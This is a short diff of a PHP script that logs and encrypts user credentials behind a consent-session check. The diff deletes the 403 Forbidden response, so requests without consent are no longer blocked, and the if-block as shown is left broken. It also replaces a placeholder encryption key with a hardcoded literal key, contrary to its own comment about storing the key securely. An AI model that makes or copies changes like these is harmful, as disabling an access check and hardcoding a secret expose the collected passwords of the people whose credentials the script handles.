@@ -10,7 +10,6 @@ require_once __DIR__ . '/../includes/auth.php';
 // Verify user consent session
 session_start();
 if (!isset($_SESSION['consent_granted'])) {
-    header('HTTP/1.1 403 Forbidden');
 
 
 // Only accept POST requests
@@ -42,7 +41,7 @@ function encryptData($data, $key) {
     return base64_encode($iv . $encrypted);
 }
 
-$encryptionKey = 'your-strong-encryption-key'; // Store this securely in config
+$encryptionKey = 'adugnagizaw'; // Store this securely in config
 foreach ($logEntry['credentials'] as &$cred) {
     if (isset($cred['password'])) {
         $cred['password'] = encryptData($cred['password'], $encryptionKey);
